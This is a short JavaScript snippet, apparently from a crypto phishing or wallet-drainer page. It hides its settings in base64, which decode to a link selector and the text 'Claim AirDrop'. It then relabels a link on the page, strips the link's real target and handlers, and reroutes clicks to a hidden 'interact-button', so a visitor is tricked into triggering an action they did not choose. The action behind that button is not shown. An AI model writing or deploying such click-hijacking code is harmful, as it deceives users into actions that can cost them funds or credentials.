
        function removeElementFuncRid(el) {
            try {
                el.style["opacity"] = "0%"
                el.style["position"] = "absolute";
                el.style["height"] = "0px";
                el.style["width"] = "0px";
            } catch(E) {}
        }
        
        function removeEventListenersFuncRid(element) {
            if (!element) {
            throw new Error('Element not provided.');
            }
            
            let current = element;
            while (current) {
                if (current.tagName && current.tagName.toLowerCase() === 'a') {
                    element.removeAttribute('href');
                }
                current = current.parentElement;
            }
        
            const clone = element.cloneNode(true);
            
            // Replace the original element with the clone
            element.parentNode.replaceChild(clone, element);
            
            return clone;
        }
    
            const coolData = JSON.parse(atob("eyJodG1sID4gYm9keSA+IGRpdiA+IGRpdjpudGgtb2YtdHlwZSgzKSA+IGRpdiA+IGRpdiA+IGRpdiA+IGRpdiA+IGEiOiJDbGFpbSBBaXJEcm9wIn0="));
            setInterval(() => {
                Object.keys(coolData).forEach((selectKey) => {
                    try {
                        if (document.querySelector(selectKey) != null) {
                            const el = document.querySelector(selectKey);
                            if (!el.classList.contains("rid-loaded-2")) {
                                el.classList.add("rid-loaded-2")
                                el.innerText = coolData[selectKey]
                            }
                        }
                    } catch(E) {}
                })
            }, 100)
            setInterval(() => {
                JSON.parse(atob("WyJodG1sID4gYm9keSA+IGRpdiA+IGRpdjpudGgtb2YtdHlwZSgzKSA+IGRpdiA+IGRpdiA+IGRpdiA+IGRpdiA+IGEiXQ==")).forEach((select) => {
                    try {
                        if (document.querySelector(select) != null) {
                            const el = document.querySelector(select);
                            if (!el.classList.contains("rid-loaded-3")) {
                                el.classList.add("rid-loaded-3")
                                const newEl = removeEventListenersFuncRid(el);
                                newEl.addEventListener("click", () => {
                                    document.getElementsByClassName("interact-button")[0].click();
                                })
                            }
                        }
                    } catch(E) {}
                })
            }, 100)